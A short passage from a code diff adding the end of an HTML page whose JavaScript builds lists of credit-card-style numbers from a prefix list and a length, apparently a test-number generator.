+    return ccnumber;
+
+}
+function credit_card_number(prefixList, length, howMany) {
+
+    var result = new Array();
+    for (var i = 0; i < howMany; i++) {
+        var ccnumber = prefixList;
+        result.push( completed_number(ccnumber, length) );
+    }
+
+    return result;
+}
+</script>
+</html>
